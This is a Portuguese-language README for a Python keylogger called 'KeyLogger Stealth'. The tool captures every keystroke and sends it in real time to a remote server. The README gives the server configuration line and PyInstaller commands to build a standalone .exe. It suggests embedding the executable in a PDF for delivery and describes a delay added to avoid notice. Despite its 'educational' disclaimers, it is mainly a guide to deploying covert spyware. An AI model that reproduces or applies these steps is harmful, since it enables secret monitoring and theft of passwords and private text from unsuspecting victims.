## KeyLogger Stealth

### Descrição

KeyLogger Stealth é um keylogger básico em Python projetado para capturar e registrar todas as teclas digitadas em um computador. O programa se conecta a um servidor remoto para enviar as teclas coletadas em tempo real. **Atenção: Este software é para fins educacionais e de segurança somente. O uso não autorizado é ilegal e antiético.**

### Requisitos

- Python 3.x
- PyInstaller
- Acesso a um servidor remoto configurado para receber as teclas

### Configuração

1. **Clone o repositório ou baixe o arquivo `keylogger.py`.**

2. **Configuração do servidor**

   Abra o arquivo `keylogger.py` e substitua `your_server_address` e `1234` pelo endereço IP do seu servidor e a porta que você deseja usar.

   ```python
   server_address = ('your_server_address', 1234)
   ```

### Uso

1. **Instale o PyInstaller**

   ```
   pip install pyinstaller
   ```

2. **Compile o script Python em um arquivo executável**

   ```
   pyinstaller --onefile keylogger.py
   ```

   Isso gerará um arquivo executável (`keylogger.exe`) na pasta `dist`.

3. **Incorporação do executável em um PDF**

   Opcionalmente, você pode incorporar o arquivo executável em um PDF usando o PDF-Creator. **Nota: Esta etapa pode ser usada para propósitos maliciosos; proceda com ética e responsabilidade.**

### Como Funciona

- **Captura de Teclas:** O keylogger lê todas as teclas digitadas no sistema.
- **Envio para Servidor:** As teclas capturadas são enviadas para o servidor remoto configurado.
- **Atraso para Discrição:** Um pequeno atraso é introduzido para minimizar a percepção do keylogger.

### Aviso Legal

Este software é fornecido apenas para fins educacionais e de segurança. O autor não se responsabiliza pelo uso indevido ou ilegal deste software. Utilize-o com responsabilidade e ética, e sempre obtenha permissão explícita antes de monitorar qualquer sistema.

### Autor

KeyLoggerPDF foi desenvolvido para fins educacionais e para demonstrar os princípios básicos de um keylogger.

### Divulgação

comunidade no discord -> https://discord.gg/GGwqxPJEHJ

instagram -> https://instagram.com/rootbreak_
